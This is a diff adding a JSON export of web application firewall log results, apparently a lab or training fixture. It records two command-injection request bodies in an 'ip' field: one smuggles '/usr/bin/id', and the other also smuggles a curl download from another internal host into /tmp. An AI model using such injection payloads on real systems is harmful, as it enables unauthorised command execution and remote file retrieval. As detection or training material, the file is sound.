@@ -1,0 +1,42 @@
+{
+  "preview": false,
+  "init_offset": 0,
+  "messages": [],
+  "fields": [
+    {
+      "name": "_time"
+    },
+    {
+      "name": "transaction.transaction_id"
+    },
+    {
+      "name": "transaction.remote_address"
+    },
+    {
+      "name": "response.status"
+    },
+    {
+      "name": "audit_data.engine_mode"
+    },
+    {
+      "name": "request.body{}"
+    }
+  ],
+  "results": [
+    {
+      "_time": "2026-10-28T22:55:51.831+00:00",
+      "transaction.transaction_id": "auJ9dNiFW_n_Ji-Anla9kwAAAAA",
+      "transaction.remote_address": "192.168.144.1",
+      "response.status": "200",
+      "request.body{}": "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid%3B+curl+--interface+192.168.144.20+--proxy+http%3A%2F%2F192.168.144.20%3A3128+--noproxy+%22%22+http%3A%2F%2F192.168.144.1%3A8090%2Ftraining-note.txt+-o+%2Ftmp%2Fsoc-training-note.txt&Submit=Submit"
+    },
+    {
+      "_time": "2026-10-28T22:55:38.538+00:00",
+      "transaction.transaction_id": "auJ9Z22WV9dQBmHAY3MC_wAAAAM",
+      "transaction.remote_address": "192.168.144.1",
+      "response.status": "200",
+      "request.body{}": "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid&Submit=Submit"
+    }
+  ],
+  "highlighted": {}
+}
